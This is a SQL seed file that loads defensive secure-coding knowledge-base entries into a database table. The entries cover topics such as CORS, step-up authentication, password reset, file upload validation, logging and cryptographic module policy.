INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce sequential step orderNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an functionality consists out of following several steps to achieve some goal i.e,NEWLINENEWLINEUser adds items to chart -> User enters shipping information -> User pays for goods -> Items will be shipped.NEWLINEYou want to make sure the user can not skip the payment step in order to receive his goods.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to verify that this stage was run through by a sincere user you want to enforceNEWLINEthe application to only process business logic flows in sequential step order, with allNEWLINEsteps being processed in realistic human time, and not process out of order, skipped steps,NEWLINEprocessed steps from another user, or too quickly submitted transactions.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Aggregate user requestsNEWLINE- CSRF injectionNEWLINE', 'Enforce sequential step order'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Step up or adaptive authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user browses a section of a web based application that contains sensitiveNEWLINEinformation the user should be challenged authenticate again using a higher assuranceNEWLINEcredential to be granted access to this information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has additional authorizationNEWLINE(such as step up or adaptive authentication) so the user is challenged before beingNEWLINEgranted access to sensitive information. This rule also applies for making criticalNEWLINEchanges to an account or action.NEWLINENEWLINEThis also means that the adaptation of authentication hasNEWLINEto be implemented in such a manner that the application correctly enforces context-sensitiveNEWLINEauthorization so as to not allow unauthorized manipulation by means of in example, parameter tampering.NEWLINE', 'step up or adaptive authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cross origin resource sharingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECross Origin Resource Sharing or CORS is a mechanism that enables a web browser to performNEWLINE''cross-domain'' requests using the XMLHttpRequest L2 API in a controlled manner.NEWLINEIn the past, the XMLHttpRequest L1 API only allowed requests to be sent within the sameNEWLINEorigin as it was restricted by the same origin policy.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECross-Origin requests have an Origin header, that identifies the domain initiating theNEWLINErequest and is always sent to the server. CORS defines the protocol to use between a webNEWLINEbrowser and a server to determine whether a cross-origin request is allowed. In order toNEWLINEaccomplish this goal, there are a few HTTP headers involved in this process,NEWLINEthat are supported by all major browsers:NEWLINENEWLINE- OriginNEWLINE- Access-Control-Request-MethodNEWLINE- Access-Control-Request-HeadersNEWLINE- Access-Control-Allow-OriginNEWLINE- Access-Control-Allow-CredentialsNEWLINE- Access-Control-Allow-MethodsNEWLINE- Access-Control-Allow-HeadersNEWLINENEWLINEThings you must consider when using CORSNEWLINENEWLINE1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to beNEWLINEcross domain; this behavior can lead to code injection by a remote attacker. Pay extraNEWLINEattention to absolute URLs.NEWLINENEWLINE2. Ensure that URLs responding with Access-Control-Allow-Origin: * do not include anyNEWLINEsensitive content or information that might aid attacker in further attacks.NEWLINEUse the Access-Control-Allow-Origin header only on chosen URLs that need to beNEWLINEaccessed cross-domain. Don''t use the header for the whole domain.NEWLINENEWLINE3. Allow only selected, trusted domains in the Access-Control-Allow-Origin header.NEWLINEPrefer white-listing domains over blacklisting or allowing any domainNEWLINE(do not use * wildcard nor blindly return the Origin header content without any checks)NEWLINENEWLINE4. Keep in mind that CORS does not prevent the requested data from going to anNEWLINEunauthenticated location. It''s still important for the server to perform usualNEWLINECSRF prevention.NEWLINENEWLINE5. While the RFC recommends a pre-flight request with the OPTIONS verb, currentNEWLINEimplementations might not perform this request, so it''s important that "ordinary"NEWLINE(GET and POST) requests perform any access control necessary.NEWLINENEWLINE6. Discard requests received over plain HTTP with HTTPS origins to prevent mixedNEWLINEcontent bugs.NEWLINENEWLINE7. Don''t rely only on the Origin header for Access Control checks. Browser always sendsNEWLINEthis header in CORS requests, but may be spoofed outside the browser.NEWLINEApplication-level protocols should be used to protect sensitive data.NEWLINENEWLINE**NOTE:** Always make sure that even though you have set the allow origin header to trusted sources, youNEWLINEhave to make authentication/session management before displaying sensitive information.NEWLINE', 'Cross origin resource sharing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Prevent password leakingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an users password is displayed on screen or send by email, an attacker gains theNEWLINEopportunity of compromising the password since it is displayed or sent in plain text.NEWLINESince the password is displayed on screen it could even be copied simply by looking at it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever display passwords on screen in an unprotected matter since this could easily leadNEWLINEto the password being compromised.NEWLINESome practices are for you to:NEWLINENEWLINE- set input field type to password.NEWLINE- Set autocomplete=off for the password input field.NEWLINENEWLINEThis turns off the auto complete and remember password features of the browser.NEWLINENEWLINE## NOTE:NEWLINEFor some browsers this means you have to put all the input fields the form containsNEWLINEto autocomplete=off, otherwise it will not comply.NEWLINENEWLINEAlso whenever a user has the opportunity to use password forget functionsNEWLINEyou should send a reset link rather than a new auto-generated password.NEWLINE', 'Prevent password leaking'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All authentication controls must fail securelyNEWLINE-------NEWLINENEWLINE## Description:NEWLINEHandling errors securely is a key aspect of secure coding.NEWLINEThere are two types of errors that deserve special attention. The first is exceptionsNEWLINEthat occur in the processing of a security control itself. It''s important that theseNEWLINEexceptions do not enable behavior that the countermeasure would normally not allow.NEWLINEAs a developer, you should consider that there are generally three possible outcomesNEWLINEfrom a security mechanism:NEWLINENEWLINE1. allow the operationNEWLINE2. disallow the operationNEWLINE3. exceptionNEWLINENEWLINEIn general, you should design your security mechanism so that a failure will follow the same execution pathNEWLINEas disabling the operationNEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all the access control systems are thoroughly tested for failing securely beforeNEWLINEusing it in your application. It is common that complete unit-test are created especiallyNEWLINEfor this purpose.NEWLINE', 'All authentication controls must fail securely'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forget password functionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user forgets his password and your application provides a passwordNEWLINEforget functionality or any other type of recovery pathsNEWLINEthere are a couple of things to take into consideration when you want to harden itsNEWLINEsecurity.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe forget password function should never send a new password by email but should containNEWLINEa reset link with a token which is valid for a limited amount of time.NEWLINEAdditional authentication based on soft-tokensNEWLINE(e.g. SMS token, native mobile applications, etc.) can be required as well before theNEWLINElink is sent over. Also make sure whenever such a recovery cycle is started, theNEWLINEapplication does not reveal the users current password in any way.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Prevent password leakingNEWLINE- Disallow the use of old passwordsNEWLINE- Predictable password and/or token generationNEWLINE', 'Forget password functions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate access control protectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINE Verify the system can protect against aggregation or continuous access ofNEWLINE secured functions, resources, or data. For example, possibly by the use of aNEWLINE resource governor to limit the number of edits per hour or to prevent the entire databaseNEWLINE from being scraped by an individual user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe system should contain a counter which can keep up with the number of times a certainNEWLINEusers addresses database tables and should be rejected when he passes a reasonable number.NEWLINEThis violation should also be reported since it could indicate an attacker scraping yourNEWLINEtable contents and stealing company information.NEWLINE', 'Aggregate access control protection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Canonicalization of user inputNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever user-input is partially validated there is a high probability that the applicationNEWLINEmisses a malicious input which could execute into a successful attack on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll user-input should be validated whenever the user-input string is complete and is beingNEWLINEprocessed by your application.NEWLINE', 'Canonicalized user input'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Approved random number generatorNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe lack of entropy available for, or used by, a pseudo-random number generator can be aNEWLINEstability and security threat.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll random numbers, random file names, random GUIDs, and random must be generated usingNEWLINEthe cryptographic module''s approved random number generator when these random values areNEWLINEintended to be unguessable/unpredictable by an attacker.NEWLINE', 'Approved random number generator'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Validated cryptographic modulesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe National Institute of Standards and Technology (NIST) issued the FIPS 140 PublicationNEWLINESeries to coordinate the requirements and standards for cryptography modules that includeNEWLINEboth hardware and software components. Protection of a cryptographic module within aNEWLINEsecurity system is necessary to maintain the confidentiality and integrity of theNEWLINEinformation protected by the module.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that cryptographic modules used by the application have been validated againstNEWLINEFIPS 140-2 or an equivalent standard.NEWLINE', 'Validated cryptographic modules'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SSI injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWeb servers usually give developers the ability to add small pieces of dynamic code insideNEWLINEstatic HTML pages, without having to deal with full-fledged server-sideNEWLINEor client-side languages.NEWLINENEWLINEThis feature is incarnated by the Server-Side Includes (SSI).NEWLINEThe attacker will try to inject code into the application that willNEWLINEbe interpreted by SSI mechanisms. A successful exploitation of this vulnerabilityNEWLINEallows an attacker to inject code into HTML pages or even perform remote code execution.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe SSI handler on the web-server should not be activated when it is not used.NEWLINE', 'SSI injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Policy for managing cryptographic keysNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen there is no policy for managing your cryptographic keys, expired or revoked keysNEWLINEthat could unknowingly be used again thus becoming a threat for your encrypted data.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is an explicit policy for how cryptographic keys are managedNEWLINE(e.g., generated, distributed, revoked, expired). Verify that this policy is properlyNEWLINEenforced.NEWLINE', 'Policy for managing cryptographic keys'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTPS and weakly or unencrypted linksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEImagine the scenario where you have a login form and an application which supports HTTPS.NEWLINEWhenever the initial connection (login.php) is not HTTPS and after login (loggedin.php)NEWLINEwill be HTTPS the username and password will not be send through an encrypted manner thusNEWLINEcould be easily compromised by attackers. This principle also applies to sendingNEWLINEvulnerable data towards other unencrypted/weak encrypted links in your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not traverse unencrypted or weakly encrypted links.NEWLINEAs soon as you allow a single connection to be send over unencrypted lines, theNEWLINEintegrity and confidentiality of your data can no longer be guaranteed.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- HTTP strict transport securityNEWLINE- HSTS preloadNEWLINE', 'HTTPS and weakly or unencrypted links'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Error handling on trusted devicesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever error handling is not applied through trusted devices the errors it supplies canNEWLINEnot be trusted since they can be tampered with.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all error handling is performed on trusted devices.NEWLINE', 'Error handling on trusted devices'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single application-level loggingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application contains a single application-level logging implementation itNEWLINEbecomes clear, transparent and easy to maintain. It also reduces the possibility that youNEWLINEoverlook high priority logging.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is a single application-level logging implementation that is used byNEWLINEthe software.NEWLINE', 'Single application level logging'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate user requestsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEVerify the system can protect against aggregation or continuous access to functions,  NEWLINEresources, or data. For example, possibly by the use of a resource governor to limit theNEWLINEnumber of edits per minute in order to to prevent an automatic attackNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has the ability to detect and alert on abnormal numbers of requestsNEWLINEfor information or processing high value transactions for that user role, such as screenNEWLINEscraping, automated use of web service extraction, or data loss prevention. For example,NEWLINEthe average user should not be able to access more than 5 records per hour or 30 recordsNEWLINEper day, or add 10 friends to a social network per minute.NEWLINE', 'Aggregate user requests'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Principle of least privilegeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe principle means giving a user account only those privileges which are essential toNEWLINEthat users work. For example, a backup user does not need to install software: hence,NEWLINEthe backup user has rights only to run backup and backup-related applications.NEWLINEAny other privileges, such as installing new software, are blocked.NEWLINENEWLINEThe principle applies also to a personal computer user who usually does work in a normalNEWLINEuser account, and opens a privileged, password protected account (that is, a superuser)NEWLINEonly when the situation absolutely demands it.NEWLINENEWLINEThis principle can also be applied to your web-applications. Instead of solely dependingNEWLINEon role based authentication methods using sessions, we rather want to assign privilegesNEWLINEto users by means of a Database-Based Authentication system.NEWLINENEWLINEWe still use sessions in order to identify if the user was logged in correctly, only nowNEWLINEinstead of assigning that user with a specific role we assign him with privileges toNEWLINEverify which actions he is privileged to perform on the system.NEWLINENEWLINEAlso a big pro of this method is, whenever a user has to be assigned less privilegesNEWLINEyour changes will be applied on the fly since the assigning does not depend on the sessionNEWLINEwhich otherwise had to expire first.NEWLINE', 'Principle of least privilege'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# TLS implementation must operate in an approved mode of operationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo enforce the maximum amount of security out of the TLS implementation it should alwaysNEWLINEsuffice the approved mode of operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESee See http://csrc.nist.gov/groups/STM/cmvp/documents/fips140-2/FIPS1402IG.pdfNEWLINEfor more extended details on how to reach this goal.NEWLINE', 'TLS implementation must operate in an approved mode of operation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Character encodingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECharacter encoding is the process of mapping characters, numbers and other symbols to aNEWLINEstandard format. Typically, this is done to create a message ready for transmissionNEWLINEbetween sender and receiver. It is, in simple terms, the conversion of charactersNEWLINE(belonging to different languages like English, Chinese, Greek or any other known language)NEWLINEinto bytes. An example of a widely used character encoding scheme is the AmericanNEWLINEStandard Code for Information Interchange (ASCII) that initially used 7-bit codes.NEWLINEMore recent examples of encoding schemes would be the Unicode UTF-8 and UTF-16 computingNEWLINEindustry standards. In the space of application security and due to the plethora ofNEWLINEencoding schemes available, character encoding has a popular misuse. It is being used forNEWLINEencoding malicious injection strings in a way that obfuscates them. This can lead to theNEWLINEbypass of input validation filters, or take advantage of particular ways in which browsersNEWLINErender encoded text.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen trying to figure out the character encoding of a resource, user agents will try, inNEWLINEthis order:NEWLINENEWLINE* The HTTP Content-Type header sent by the serverNEWLINE* the XML declaration (only for XHTML documents)NEWLINE* HTML/XHTML meta element.NEWLINENEWLINEMake sure this information is provided by your application for the server in order toNEWLINEprevent it from guessing the wrong encoding standard, leaving room for injection.NEWLINENEWLINE## Note:NEWLINENEWLINEThese three ways of providing the character encoding of a document are notNEWLINEequivalent.NEWLINE', 'Character encoding'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP request methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP offers a number of methods that can be used to perform actions on the web server.NEWLINEMany of these methods are designed to aid developers in deploying and testingNEWLINEHTTP applications. These HTTP methods can be used for nefarious purposes if the webNEWLINEserver is misconfigured.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the application accepts only a defined set of HTTP request methods, such asNEWLINEGET and POST and unused methods are explicitly blocked/disabled.NEWLINE', 'HTTP request methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# File upload injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUploaded files represent a significant risk to applications.NEWLINEThe first step in many attacks is to get some code to the system to be attacked.NEWLINEThen the attack only needs to find a way to get the code executed. Using a file uploadNEWLINEhelps the attacker accomplish the first step.NEWLINENEWLINEThe consequences of unrestricted file upload can vary, including complete system takeover,NEWLINEan overloaded file system or database, forwarding attacks to back-end systems, and simpleNEWLINEdefacement.NEWLINENEWLINEThere are really two classes of problems here.NEWLINEThe first is with the file metadata, like the path and file name.NEWLINEThese are generally provided by the transport, such as HTTP multi-part encoding.NEWLINEThis data may trick the application into overwriting a critical file or storing the fileNEWLINEin a bad location. You must validate the metadata extremely carefully before using it.NEWLINENEWLINEThe other class of problem is with the file size or content.NEWLINEAn attacker can easily craft a valid image file with php code inside.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUploaded files always needs to be placed outside the document root of the web-server.NEWLINENEWLINEYou should also check the user-input(filename) for having the rightNEWLINEallowed extensions such as .jpg, .png etc.NEWLINENEWLINENote: when checking these extensions always make sure your application validates the lastNEWLINEpossible extension so an attacker could not simply inject ".jpg.php" and bypass yourNEWLINEvalidationNEWLINENEWLINEAfter this validation you must also check the user-input(filename) for containing possibleNEWLINEpath traversal patterns in order to prevent him from uploading outside ofNEWLINEthe intended directory.NEWLINENEWLINEMost developers also do a mime-type check. This is a good protection however notNEWLINEwhenever you are checking this mime-type through the post request. This header can not beNEWLINEtrusted since it can be easily manipulated by an attacker.NEWLINENEWLINEThe best way to check the mime-typeNEWLINEis to extract the file from the server after uploading and check it from the file itself.NEWLINEDeleting it whenever it does not comply with expected values.NEWLINENEWLINEYou may also want to check if the filenames do already exist before uploading in order toNEWLINEprevent the overwriting of files.NEWLINENEWLINEAlso for serving the files back there needs to be a file handler function that can selectNEWLINEthe file based on an identifier that will serve the file back towards the user.NEWLINE', 'File upload injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verbose version informationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINERevealing system data or debugging information helps an adversary learn about the systemNEWLINEand form a plan of attack. An information leak occurs when system data or debuggingNEWLINEinformation leaves the program through an output stream or logging function.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the HTTP headers do not expose detailed version information of systemNEWLINEcomponents. For each different type of server there are hardening guides dedicatedNEWLINEespecially for this type of data leaking.NEWLINE', 'Verbose version information'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP headers added by a front-endNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUse these kind of HTTP headers such as a bearer token only if you have authenticated the sever sendingNEWLINEthe header to your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that HTTP headers added by a trusted proxy or SSO devices, such as a bearer token, areNEWLINEauthenticated by the application.NEWLINE', 'HTTP headers added by a frontend'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session management controlNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe ability to restrict and maintain user actions within unique sessions is critical toNEWLINEweb security. Most users of this guide will be using an application framework with builtNEWLINEin session management capabilities. Others will use languages such as Perl CGI that do not.NEWLINEThose without a built in session management system and those who override the existingNEWLINEsession management systems are at an immediate disadvantage. Implementations built fromNEWLINEscratch are often weak and breakable. Developers are strongly discouraged fromNEWLINEimplementing their own Session Management.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways use the frameworks default session management control implementationNEWLINEin your application. If not possible you should find hardened guides in how to accomplishNEWLINEthis in a secure manner.NEWLINE', 'Session management control'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Available log analysis toolsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWith a log analysis tool in place you can easily and quickly do forensics as soon as youNEWLINEnotice your application is under attack by attackers and block them out.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEA list of recommended tools by OWASP you can find atNEWLINEhttps://www.owasp.org/index.php/Log_review_and_management#Logging_ToolsNEWLINE', 'Available log analysis tools'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Distinguish log-fields from trusted and untrusted sourcesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever log fields are distinguished from each other by means of logs from trusted andNEWLINEuntrusted log fields in your log entries your logs become clearer and more transparent.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that log fields from trusted and untrusted sources are distinguishable inNEWLINElog entries. If possible it is highly recommended that you separate these filesNEWLINEentirely from each other so the logs with untrusted user-input cannot corrupt theNEWLINEsystem generated logs.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Logging implemented on the server sideNEWLINE- Log injectionNEWLINE- The audit log must include a priority systemNEWLINE- User credentials in audit logsNEWLINE- Logging guidelinesNEWLINE', 'Distinguish log'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sanitize sensitive data rapidly from memoryNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive data is rapidly removed from the systems memory, this decreases theNEWLINEpossibility the attacker can compromise this data since it is removed as soon as it is noNEWLINElonger needed.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that sensitive data is rapidly sanitized from memory as soon as it is no longerNEWLINEneeded and handled in accordance to functions and techniques supported by theNEWLINEframework/library/operating system.NEWLINE', 'sanitise sensitive data rapidly from memory'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging is performed before executing the transactionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the logging is performed before executing a transaction you can be ensured thatNEWLINEthe transactions are logged. This increases the integrity of your log files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that logging is performed before executing the transaction. If logging wasNEWLINEunsuccessful (e.g. disk full, insufficient permissions) the application fails safe.NEWLINEThis is for when integrity and non-repudiation is a must.NEWLINE', 'logging is performed before executing the transaction'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verify integrity using checksumsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlways use checksums when working with interpreted code, libraries, executables,NEWLINEand configuration files, when these checksums do not match you can determine thatNEWLINEthese files are corrupted or backdoor-ed.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the integrity of interpreted code, libraries, executables, and configurationNEWLINEfiles is verified using checksums or hashes (not MD5).NEWLINE', 'Verify integrity using checksums'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Deny access from remote resources or systemsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEYou should always fend of remote connections with untrusted systems/resources which try toNEWLINEconnect to your application in order to prevent connecting to malicious systems that tryNEWLINEto attack your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESince this is very difficult to achieve on application level we recommend implementingNEWLINEEGRESS firewall rules.NEWLINE', 'Deny access from remote resources or systems'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Certificate paths/revocation informationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your certificate authority is not trusted anymore you should always be able toNEWLINErecall these certificates asap.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe trust anchor for given zone is found in the keyset-<zone name> file on the secureNEWLINEsigning computer in the same location where the signed and unsigned copies of the zone reside.NEWLINEThis file is created automatically as part of the signing process.NEWLINEA certificate revocation list (CRL) is a list, created and signed by aNEWLINEcertificate authority (CA), which contains serial numbers of certificates that have beenNEWLINEissued by that CA and are currently revoked. In addition to the serial number for theNEWLINErevoked certifications, the CRL also contains the reason for revocation for each certificateNEWLINEand the time the certificate was revoked. The serial number for each revoked certificate isNEWLINEkept in the CAs database and published in the CRL until the certificate expires.NEWLINENEWLINEAfter the revoked certificate is expired, the certificates entry in the CRL is removed andNEWLINEthe CA may remove the certificate from its database. Typically, the revoked certificateNEWLINEwill remain in the CRL for one publication period after the certificate expires. By allNEWLINEtimes you should have this information in reach in order to take quick actions.NEWLINE', 'Certificate paths revocation information'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Version managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a programmer decides to use third party software,NEWLINEhe should keep an eye implementing a proper version management methodology for this software.NEWLINEWhen hackers discover vulnerabilities they often publish these exploits online in orderNEWLINEto push the developers of this software to fix their issues. As a result,NEWLINEwhen your software is not upgraded to the latest available version,NEWLINEscript kiddies could easily compromise your application by following theNEWLINEexploit tutorials online, thus compromising your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOne option is not to use components that you did not write.NEWLINEBut that is not very realistic.NEWLINENEWLINEMost component projects do not create vulnerability patches for old versions.NEWLINEInstead, most simply fix the problem in the next version. So upgrading to these newNEWLINEversions is critical.NEWLINESoftware projects should have a process in place to:NEWLINENEWLINE-Identify all components and the versions you are using, including all dependencies.NEWLINE(e.g., the versions plugin).NEWLINENEWLINE-Monitor the security of these components in public databases,NEWLINEproject mailing lists, and security mailing lists, and keep them up to date.NEWLINENEWLINE-Establish security policies governing component use, such as requiring certain softwareNEWLINEdevelopment practices, passing security tests, and acceptable licenses.NEWLINENEWLINE-Where appropriate, consider adding security wrappers around components to disable unusedNEWLINEfunctionality and/ or secure weak or vulnerable aspects of the component.NEWLINENEWLINEThis also goes for all other components that should be up to date with proper securityNEWLINEconfiguration(s) and version(s) such as server OS etc.NEWLINENEWLINEThis should include removal of unneeded configurations and folders such as sampleNEWLINEapplications, platform documentation, and default or example users.NEWLINE', 'Version management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side Caching and HTML5 CachingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEDevelopers creating HTML5 applications can create fully offline-aware applications usingNEWLINEthe HTML5 ApplicationCache interface. The Application Cache uses a cache manifest file toNEWLINEspecify which files in an HTML5 application can be used offline, and which files require aNEWLINEnetwork connection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever store sensitive information in a client side cache since this can be easilyNEWLINEcompromised by attackers. The same principle does also apply to autocomplete functions.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Caching headersNEWLINE- Client side storageNEWLINE', 'HTML Caching'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic modules should operate in their approved mode according to their published security policiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever cryptographic modules do not operate in their approved mode according to theirNEWLINEpublished security policies these methods could become weak and become inadequate toNEWLINEensure strong cyphers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways verify that cryptographic modules operate in their approved mode according toNEWLINEtheir published security policies before implementing them into your application.NEWLINE', 'Cryptographic modules should operate in their approved mode according to their published security policies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sending data/parameters to untrusted devicesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application sends data/parameters to untrusted devices this data could beNEWLINEcompromised if the device has malicious intents.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application minimizes the number of parameters sent to untrusted systems,NEWLINEsuch as hidden fields, Ajax variables, cookies and header values.NEWLINENEWLINEThese untrusted devices should also be documented if possible and should be taken intoNEWLINEaccount when developing your application to minimize the possibility you sendNEWLINEunintended sensitive data towards these devices.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- High level architecture should be definedNEWLINE- Identify all application componentsNEWLINE', 'Sending data parameters to untrusted devices'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Process high value business logic flows in a trusted environmentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever high value business logic flows are processed in a trusted monitored environmentNEWLINEit reduces the movability of an attacker and chances of succeeding toNEWLINEperform successful attacks. If an attacker should breach your application his actionsNEWLINEcould be rapidly followed and counter measures could be taken.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application processes or verifies all high value business logic flows in aNEWLINEtrusted environment, such as on a protected and monitored server.NEWLINE', 'Proces high value business logic flows in a trusted environment'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Data from untrusted sourcesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever data from untrusted servers is executed by your application there is a highNEWLINEprobability this data could be contaminated with malicious code. Such as for exampleNEWLINEXSS from JSON files, or XXE when parsing XML files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application code does not execute uploaded data obtained from untrusted sources.NEWLINEYou could consider sandboxing this data when showing the content on your application.NEWLINENEWLINENOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended toNEWLINEalso encode or escape all data entering your application from third party sources.NEWLINE', 'Data from untrusted sources'); 
